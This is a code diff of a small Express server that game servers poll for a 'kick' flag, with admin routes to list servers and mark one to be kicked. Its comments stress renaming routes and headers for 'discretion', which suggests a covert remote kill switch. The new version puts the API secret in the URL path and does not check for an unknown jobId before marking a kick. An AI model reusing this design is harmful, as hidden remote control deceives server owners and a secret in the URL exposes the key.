@@ -3,44 +3,34 @@ const app = express();
 app.use(express.json());
 const PORT = process.env.PORT || 3000;
 
-let sessionRegistry = {};
-const AUTH_TOKEN = process.env.API_KEY; // We still use your secret key
+let activeServers = {};
+const SECRET_PATH = process.env.API_KEY; // Your "password" is now part of the URL
 
-// Renamed for discretion: /v1/sync instead of /poll
-app.post('/v1/sync', (req, res) => {
-    const token = req.headers['x-api-token']; // Renamed header
-    if (token !== AUTH_TOKEN) return res.status(401).send();
+// 1. DISCRETE POLL: The key is now in the URL path (e.g., /poll/YourSecretKey)
+app.post(`/poll/${SECRET_PATH}`, (req, res) => {
+    let { jobId, playerCount } = req.body;
+    if (!jobId || jobId === "") jobId = "Unknown";
 
-    const { sid, pCount } = req.body; // Using short names to be discrete
-    if (!sid) return res.status(400).send();
-
-    if (!sessionRegistry[sid]) {
-        sessionRegistry[sid] = { active: true, terminate: false };
+    if (!activeServers[jobId]) {
+        activeServers[jobId] = { shouldKick: false };
     }
 
-    sessionRegistry[sid].lastUpdate = Date.now();
-    sessionRegistry[sid].players = pCount;
+    activeServers[jobId].lastSeen = Date.now();
+    activeServers[jobId].playerCount = playerCount;
 
-    // "u" stands for update (true means kick)
-    res.json({ u: sessionRegistry[sid].terminate });
+    res.json({ kick: activeServers[jobId].shouldKick });
 });
 
-// Admin: List all sessions
-app.get('/admin/inspect', (req, res) => {
-    if (req.headers['x-api-token'] !== AUTH_TOKEN) return res.status(401).send();
-    res.json(sessionRegistry);
+// ADMIN ENDPOINTS (Keep these the same for ReqBin)
+app.get('/list-servers', (req, res) => {
+    if (req.headers['x-api-key'] !== SECRET_PATH) return res.status(401).send();
+    res.json(activeServers);
 });
 
-// Admin: Trigger "Update" (Kick)
-app.post('/admin/set-state', (req, res) => {
-    if (req.headers['x-api-token'] !== AUTH_TOKEN) return res.status(401).send();
-    const { sid, state } = req.body;
-    if (sessionRegistry[sid]) {
-        sessionRegistry[sid].terminate = state;
-        res.send("State updated.");
-    } else {
-        res.status(404).send("Session not found.");
-    }
+app.post('/kick-server', (req, res) => {
+    if (req.headers['x-api-key'] !== SECRET_PATH) return res.status(401).send();
+    activeServers[req.body.jobId].shouldKick = true;
+    res.send("Marked");
 });
 
-app.listen(PORT, () => console.log("System initialized."));
+app.listen(PORT);
